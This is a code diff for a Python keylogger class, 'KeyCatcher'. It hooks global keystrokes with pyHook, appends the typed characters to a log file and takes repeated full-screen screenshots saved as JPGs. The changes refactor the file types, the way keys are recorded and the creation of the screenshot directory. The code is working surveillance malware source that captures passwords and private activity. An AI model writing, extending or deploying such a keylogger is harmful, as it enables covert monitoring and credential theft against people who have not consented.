@@ -22,9 +22,9 @@ class KeyCatcher:
         """
         sets the logger
         """
-        self.data_info = DataInfo.DataInfo(data_path, "log", "screenshot", "self")
+        self.data_info = DataInfo.DataInfo(data_path, "log", "jpg", "json")
         self.data = ""
-        self.data_info.new_data_file("data_file.log")
+        self.data_info.new_data_file(DATA_FILE_NAME)
         # create a hook manager
         self.hm = pyHook.HookManager()
 
@@ -44,7 +44,7 @@ class KeyCatcher:
         """
         handle key presses by inserting them to the file
         @param event: key press event
-        """
+
         print 'MessageName:', event.MessageName
         print 'Message:', event.Message
         print 'Time:', event.Time
@@ -59,11 +59,12 @@ class KeyCatcher:
         print 'Alt', event.Alt
         print 'Transition', event.Transition
         print '---'
+        """
         # catch special keys (such as ctrl, back...)
         if not 33 < event.Ascii < 126:
             self.data += "(-%s-)" % event.Key
         else:
-            self.data += event.Key
+            self.data += chr(event.Ascii)
         if self.data > 100:
             self.data_info.write_data_file_end(self.data, DATA_FILE_NAME)
             self.data = ""
@@ -76,8 +77,11 @@ class KeyCatcher:
         """
         user32 = windll.user32
         user32.SetProcessDPIAware()
-        screen_shot = pyautogui.grab(region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
-        save_path = self.data_info.get_type_path("screenshot")
+        screen_shot = pyautogui.grab(
+            region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
+        save_path = self.data_info.get_type_path("jpg")
         # create a non existing name
+        if not os.path.exists(save_path):
+            os.makedirs(save_path)
         i = 1 + len(os.listdir(save_path))
         screen_shot.save(save_path + "\\screenshot%i.jpg" % i)
